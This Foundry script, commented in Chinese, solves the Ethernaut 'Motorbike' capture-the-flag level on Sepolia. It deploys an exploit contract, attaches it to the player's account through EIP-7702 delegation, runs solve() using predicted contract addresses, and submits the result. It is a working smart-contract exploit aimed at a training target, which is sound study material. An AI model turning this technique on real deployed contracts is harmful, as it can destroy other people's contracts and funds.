// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {MotorbikeExploit} from "../src/MotorBikeAttack.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

contract ExploitScript is Script {
    MotorbikeExploit public implementation;
    // Sepolia Ethernaut Core
    address public ethernaut = 0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6;
    // Sepolia Motorbike Level
    address public motorbikeLevel = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;

    uint256 public MY_MAIN_PK;
    address public MY_MAIN_ADDRESS;

    function setUp() public {
        MY_MAIN_PK = vm.envUint("PRIVATE_KEY"); // 讀取你的 .env 變數
        MY_MAIN_ADDRESS = vm.addr(MY_MAIN_PK);
    }

    function run() public {
        // 1. 獲取 Motorbike Level 工廠合約當前的 Nonce
        // 我們需要這個來預測即將生成的 Engine 地址
        uint256 nonce = vm.envUint("LEVEL_NONCE");
        
        console.log("Attacking with Player:", MY_MAIN_ADDRESS);
        console.log("Predicted Level Nonce:", nonce);

        vm.startBroadcast(MY_MAIN_PK);

        // 2. 部署我們的邏輯合約 (包含炸彈)
        implementation = new MotorbikeExploit();
        console.log("Exploit Logic Deployed at:", address(implementation));

        // 3. 【EIP-7702 魔法】
        // 簽署授權，讓 MY_MAIN_ADDRESS 這個 EOA 暫時擁有 implementation 的程式碼
        vm.signAndAttachDelegation(address(implementation), MY_MAIN_PK);

        // 4. 以 EOA 身份執行 solve()
        // 此時 EOA 擁有 solve() 的程式碼，並且因為是在同一筆交易中執行：
        // 創建 -> 預測 -> 銷毀，全部一氣呵成。
        MotorbikeExploit(address(uint160(MY_MAIN_ADDRESS))).solve(nonce);
        
        // 5. 提交實例：使用預測出的 Proxy 地址 (工廠 nonce+1)
        address motorbikeAddr = implementation.computeCreateAddress(motorbikeLevel, nonce + 1);
        console.log("Submitting instance:", motorbikeAddr);
        (bool success,) = ethernaut.call(abi.encodeWithSignature("submitLevelInstance(address)", motorbikeAddr));
        require(success, "submit failed");
        
        vm.stopBroadcast();
    }
}
